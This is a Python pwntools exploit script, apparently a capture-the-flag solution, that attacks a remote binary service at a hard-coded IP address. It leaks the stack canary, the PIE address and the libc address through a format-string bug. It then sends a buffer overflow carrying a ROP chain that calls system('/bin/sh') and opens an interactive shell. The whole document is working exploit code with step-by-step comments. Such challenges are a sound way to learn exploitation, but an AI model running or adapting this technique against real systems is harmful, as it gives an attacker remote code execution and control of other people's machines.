from pwn import *

context.binary = ELF("./challenge")

p = remote("13.234.20.50", 1340)
libc_symbols = ELF("libc.so.6")

pie_offset = 0x123E
libc_offset = 0x276C1 #use info proc mappings in gdb

# canary is 15, libc is 21st, pie is 17th.

p.sendlineafter(b"What's your name?", b"%15$p.%17$p.%21$p")
recv1 = p.recvuntil(
    b"hi?", drop=True
)  # this receives until 'hi?' comes but it doesnt include it in the final string

canary, pie, libc = recv1.split(b".")

canary = int(canary, 16)
pie = int(pie, 16)
libc = int(libc, 16)

bin_base = pie - pie_offset
libc_base = libc - libc_offset

libc_symbols.address = (
    libc_base  # tells libc_symbols that this is the libc base for this runtime)
)

rop = ROP(libc_symbols)

ret = rop.find_gadget(["ret"])[0]
pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]

binsh = next(libc_symbols.search(b"/bin/sh\x00"))
system = libc_symbols.sym["system"]

payload = b"A" * 72
payload += p64(canary)
payload += b"B" * 8
payload += p64(ret)  # first you align stack
payload += p64(pop_rdi)  # then pop rdi to make room for our argument
payload += p64(binsh)  # rdi now has address for bin/sh
payload += p64(system)  # this exeutes

p.send(payload)

p.interactive()
